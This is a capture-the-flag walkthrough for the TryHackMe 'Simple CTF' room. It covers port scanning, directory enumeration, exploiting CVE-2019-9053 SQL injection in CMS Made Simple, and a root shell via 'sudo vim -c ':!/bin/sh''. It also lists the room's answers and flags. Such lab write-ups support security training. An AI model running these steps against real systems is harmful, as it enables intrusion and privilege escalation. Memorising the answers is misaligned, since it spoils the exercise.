---
description: https://tryhackme.com/room/easyctf
---

# Simple CTF

## INIT

```
export easyctf=10.10.150.200
ping $easyctf

echo "10.10.150.200 easyctf.thm" >> /etc/hosts
```

## How many services are running under port 1000?

```
nmap -T5 -p1-1000 easyctf.thm
```

![](<../.gitbook/assets/image (415).png>)

{% hint style="success" %}
2
{% endhint %}

## What is running on the higher port?

```
nmap -sC -sV -T5 -p1-65535 easyctf.thm
```

![](<../.gitbook/assets/image (416).png>)

{% hint style="success" %}
ssh
{% endhint %}

## FTP

![](<../.gitbook/assets/image (418).png>)

## HTTP

![](<../.gitbook/assets/image (419).png>)

## GOBUSTER

```
gobuster dir -u easyctf.thm -w /usr/share/wordlists/dirb/common.txt -q -t 15 -x php,html,txt
```

![](<../.gitbook/assets/image (420).png>)

![](<../.gitbook/assets/image (421).png>)

> CMS Made Simple 2.2.8

## What's the CVE you're using against the application?

![](<../.gitbook/assets/image (422).png>)

![](<../.gitbook/assets/image (423).png>)

{% hint style="success" %}
CVE-2019-9053
{% endhint %}

## To what kind of vulnerability is the application vulnerable?

![](<../.gitbook/assets/image (424).png>)

{% hint style="success" %}
sqli
{% endhint %}

## What's the password?

```
python3 easyctf.py -u http://easyctf.thm/simple --crack -wordlist /usr/share/wordlists/rockyou.txt
```

![](<../.gitbook/assets/image (429).png>)

{% hint style="success" %}
secret
{% endhint %}

## Where can you login with the details obtained?

![](<../.gitbook/assets/image (426).png>)

{% hint style="success" %}
ssh
{% endhint %}

## What's the user flag?

![](<../.gitbook/assets/image (427).png>)

{% hint style="success" %}
G00d j0b, keep up!
{% endhint %}

## Is there any other user in the home directory? What's its name?

![](<../.gitbook/assets/image (428).png>)

{% hint style="success" %}
sunbath
{% endhint %}

## What can you leverage to spawn a privileged shell?

```
sudo vim -c ':!/bin/sh'
```

{% embed url="https://gtfobins.github.io/gtfobins/vim/" %}

{% hint style="success" %}
vim
{% endhint %}

## What's the root flag?

```
cat /root/root.txt
```

{% hint style="success" %}
W3ll d0n3. You made it!
{% endhint %}
